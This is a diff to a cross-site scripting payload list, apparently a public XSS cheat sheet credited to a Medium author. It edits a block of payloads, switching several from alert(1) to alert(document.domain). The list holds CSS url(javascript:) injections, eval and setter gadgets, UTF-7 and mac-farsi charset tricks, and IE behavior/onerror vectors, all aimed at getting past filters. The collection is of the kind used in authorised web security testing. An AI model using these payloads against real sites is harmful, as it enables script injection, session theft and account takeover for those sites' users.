@@ -17,19 +17,19 @@ xss
 <!--        Medium : https://medium.com/@ismailtasdelen -->
 
 <div style=content:url(%(svg)s)></div>
-<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X
+<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(document.domain));">X
 <div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
 <div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
 <div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
 <div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
 <x style="background:url('x&#1;;color:red;/*')">XXX</x>
-<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>
-<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>
+<script>({set/**/$($){_/**/setter=$,_=javascript:alert(document.domain)}}).$=eval</script>
+<script>({0:#0=eval/#0#/#0#(javascript:alert(document.domain))})</script>
 <script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>
-<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(document.domain)')()</script>
 <meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
-<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
-<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾
+<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(document.domain)&R&UA;&&<&A9&11/script&X&>
+<meta charset="mac-farsi">¼script¾javascript:alert(document.domain)¼/script¾
 X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>
 1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>
